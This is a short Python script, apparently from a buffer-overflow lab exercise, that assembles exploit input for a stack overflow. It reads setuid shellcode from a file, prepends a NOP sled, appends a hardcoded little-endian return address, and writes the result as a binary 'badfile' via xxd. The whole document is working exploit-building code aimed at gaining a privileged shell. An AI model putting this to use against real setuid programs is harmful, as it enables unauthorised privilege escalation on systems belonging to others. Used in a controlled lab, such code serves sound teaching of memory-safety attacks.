import os

# Get payload shellcode with setuid call
fr = open("shell_code_setuid","r")
shellcode = fr.read()
fr.close()

# Construct exploit input padding parts
nop_sled = "90 " * 5 + "\n"       # NOP Sled to increase hit chance (new line for readability)
return_address = "08 f5 ff bf"    # Reversed return address for little endian (spaces ignored)

# Assemble exploit and print
exploit = nop_sled + shellcode + return_address
print("Exploit outputted: ")
print(exploit)

# Write exploit to file for hex conversion
fw = open("shell_out","w+")
fw.write(exploit)
fw.close()

# Carry out hex conversion using bash cmd
os.system("xxd -p -r shell_out > badfile")
